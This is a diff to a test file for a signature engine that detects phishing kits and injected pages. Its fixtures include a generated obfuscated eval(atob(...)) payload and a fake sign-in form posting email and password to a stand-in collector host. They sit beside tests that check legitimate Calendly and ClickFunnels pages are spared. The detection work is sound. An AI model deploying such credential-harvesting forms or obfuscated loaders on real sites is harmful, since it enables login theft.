@@ -4,15 +4,22 @@
 
 import { describe, expect, test } from "bun:test";
 
-import { loadSignatures, matchSignatures, parseSignature } from "../src/signatures";
 import type { SignatureMatchInput } from "../src/index";
+
+import {
+  loadSignatures,
+  matchSignatures,
+  parseSignature,
+} from "../src/signatures";
 
 // ── incident corpus fixtures (mirrors packages/rules/tests/integrity.test.ts) ──
 
 // Large high-entropy obfuscated inline payload carrying the anti-tamper string.
 function obfuscatedPayload(): string {
-  let s = 'var _0x1a2b=function(){return "the code has been tampered!";};eval(atob("';
-  const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+  let s =
+    'var _0x1a2b=function(){return "the code has been tampered!";};eval(atob("';
+  const alphabet =
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
   let seed = 1337;
   for (let i = 0; i < 8200; i++) {
     seed = (seed * 1103515245 + 12345) & 0x7fffffff;
@@ -34,12 +41,17 @@ function kitPage(): SignatureMatchInput {
     <form action="https://evil-collector.tk/grab" method="post">
       <input type="email"><input type="password"><button>Sign in</button>
     </form></body></html>`;
-  return { url: "https://sydneyavspecialists.com.au/calendly?token=ey4m", title, html };
+  return {
+    url: "https://sydneyavspecialists.com.au/calendly?token=ey4m",
+    title,
+    html,
+  };
 }
 
 // POSITIVE — injected affiliate doorway post (campaign sibling).
 function doorwayPage(): SignatureMatchInput {
-  const title = "Calendly ClickFunnels 2.0 (5 HELPFUL TIPS) - Best Sales Funnel";
+  const title =
+    "Calendly ClickFunnels 2.0 (5 HELPFUL TIPS) - Best Sales Funnel";
   return {
     url: "https://sydneyavspecialists.com.au/blog/calendly-clickfunnels-tips",
     title,
@@ -108,7 +120,9 @@ describe("calendly-kit signature — incident corpus", () => {
       title: "Login",
       html: '<iframe id="google-auth"></iframe><script>the code has been tampered</script>',
     };
-    expect(matchSignatures(signatures, noBrand).some((h) => h.id === "calendly-kit")).toBe(false);
+    expect(
+      matchSignatures(signatures, noBrand).some((h) => h.id === "calendly-kit")
+    ).toBe(false);
   });
 
   test("SPARES a legit ClickFunnels blog title that never mentions Calendly", () => {
@@ -117,9 +131,11 @@ describe("calendly-kit signature — incident corpus", () => {
       title: "ClickFunnels 2.0: 5 Best Tips for Your Sales Funnel",
       html: "<article><p>A genuine marketing tutorial about funnels.</p></article>",
     };
-    expect(matchSignatures(signatures, legitFunnelPost).some((h) => h.id === "calendly-kit")).toBe(
-      false,
-    );
+    expect(
+      matchSignatures(signatures, legitFunnelPost).some(
+        (h) => h.id === "calendly-kit"
+      )
+    ).toBe(false);
   });
 });
 
@@ -169,7 +185,9 @@ describe("signature condition grammar", () => {
       name: "d",
       strings: { a: { contains: "aaa" }, b: { contains: "bbb" } },
     });
-    expect(matchSignatures([sig], { url: "u", html: "aaa bbb" })).toHaveLength(1);
+    expect(matchSignatures([sig], { url: "u", html: "aaa bbb" })).toHaveLength(
+      1
+    );
     expect(matchSignatures([sig], { url: "u", html: "aaa" })).toHaveLength(0);
   });
 
@@ -180,7 +198,7 @@ describe("signature condition grammar", () => {
   test("rejects a malformed signature", () => {
     expect(() => parseSignature({ id: "x" })).toThrow();
     expect(() =>
-      parseSignature({ id: "x", name: "x", strings: { a: { target: "html" } } }),
+      parseSignature({ id: "x", name: "x", strings: { a: { target: "html" } } })
     ).toThrow(/contains.*regex/);
   });
 });
@@ -193,9 +211,13 @@ describe("signature targets + regex flags", () => {
       strings: { t: { regex: "PHISH", target: "title", nocase: true } },
       condition: "t",
     });
-    expect(matchSignatures([sig], { url: "u", title: "go phish now", html: "" })).toHaveLength(1);
+    expect(
+      matchSignatures([sig], { url: "u", title: "go phish now", html: "" })
+    ).toHaveLength(1);
     // Same text in html (not title) must NOT match — target is scoped.
-    expect(matchSignatures([sig], { url: "u", title: "", html: "phish" })).toHaveLength(0);
+    expect(
+      matchSignatures([sig], { url: "u", title: "", html: "phish" })
+    ).toHaveLength(0);
   });
 
   test("scripts target matches external script bodies only", () => {
@@ -206,9 +228,15 @@ describe("signature targets + regex flags", () => {
       condition: "m",
     });
     expect(
-      matchSignatures([sig], { url: "u", html: "<p>x</p>", scripts: ["x; malware();"] }),
+      matchSignatures([sig], {
+        url: "u",
+        html: "<p>x</p>",
+        scripts: ["x; malware();"],
+      })
     ).toHaveLength(1);
-    expect(matchSignatures([sig], { url: "u", html: "malware()" })).toHaveLength(0);
+    expect(
+      matchSignatures([sig], { url: "u", html: "malware()" })
+    ).toHaveLength(0);
   });
 });
 
@@ -220,13 +248,15 @@ describe("signature targets + regex flags", () => {
 // relies on `\b` across elements would have to read separated text instead.
 describe("bundled signatures: glued and spaced element text get the same matches", () => {
   const signatures = loadSignatures();
-  const glued = "Discovery CallSign in with Google to confirm your Calendly discovery call.Sign in";
+  const glued =
+    "Discovery CallSign in with Google to confirm your Calendly discovery call.Sign in";
   const spaced =
     "Discovery Call Sign in with Google to confirm your Calendly discovery call. Sign in";
 
   test("the kit page", () => {
     const kit = kitPage();
-    const withText = (text: string) => matchSignatures(signatures, { ...kit, text });
+    const withText = (text: string) =>
+      matchSignatures(signatures, { ...kit, text });
     expect(withText(glued)).toEqual(withText(spaced));
     expect(withText(glued).some((h) => h.id === "calendly-kit")).toBe(true);
   });
@@ -234,8 +264,11 @@ describe("bundled signatures: glued and spaced element text get the same matches
   test("a legit Calendly page", () => {
     const legit = legitCalendlyPage();
     const copy = (sep: string) =>
-      ["Book a call via our Calendly integration", "Schedule on Calendly"].join(sep);
-    const withText = (text: string) => matchSignatures(signatures, { ...legit, text });
+      ["Book a call via our Calendly integration", "Schedule on Calendly"].join(
+        sep
+      );
+    const withText = (text: string) =>
+      matchSignatures(signatures, { ...legit, text });
     expect(withText(copy(""))).toEqual(withText(copy(" ")));
     expect(withText(copy(""))).toHaveLength(0);
   });
